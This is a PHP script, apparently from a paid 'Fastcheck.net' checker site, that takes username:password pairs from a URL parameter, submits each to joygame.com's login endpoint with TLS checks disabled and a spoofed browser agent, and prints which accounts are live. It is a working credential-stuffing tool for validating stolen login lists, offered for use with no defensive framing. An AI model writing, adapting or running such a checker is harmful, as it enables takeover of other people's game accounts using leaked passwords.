<?php
include_once '../includes/baglan.php';
session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}
$lista = htmlspecialchars($_GET['lista']);
$array = explode(":",$lista);

$username = trim($array[0]);
$password = trim($array[1]);


define('USER_AGENT', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36');
define('COOKIE_FILE', 'cookie.txt');
define('LOGIN_FORM_URL', 'https://www.joygame.com/Hesap/Giris');
define('LOGIN_ACTION_URL', 'https://www.joygame.com/Hesap/Giris');
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, LOGIN_ACTION_URL);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_COOKIEJAR, COOKIE_FILE);
curl_setopt($curl, CURLOPT_USERAGENT, USER_AGENT);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_REFERER, LOGIN_FORM_URL);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, false);
curl_exec($curl);
if(curl_errno($curl)){
    throw new Exception(curl_error($curl));
}
curl_setopt($curl, CURLOPT_URL, 'https://bservices.joygame.com/Hesap/JsonpLogin?TopbarLoginUserName='.$username.'&TopbarLoginPassword='.$password.'&TopbarFacebookId=0&TopbarFacebookEmail=&ReturnUrl=http%3A%2F%2Flocalhost%2Fhesapcheck.php%3Fyanit%3Dok');
curl_setopt($curl, CURLOPT_COOKIEJAR, COOKIE_FILE);
curl_setopt($curl, CURLOPT_USERAGENT, USER_AGENT);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$site=curl_exec($curl);
   preg_match('/(true.*?),/', $site, $m);
   if(@$m[0]&&$m[0]==true)
    {
      echo "✅ <b>#Aktif</b> - $username : $password - <b>www.Fastcheck.net</b> <br>";
           }
		   else{
    echo "❌ <b>#Kapalı</b> - $username : $password - <b>www.Fastcheck.net</b> <br>";
}
curl_close($curl);
?>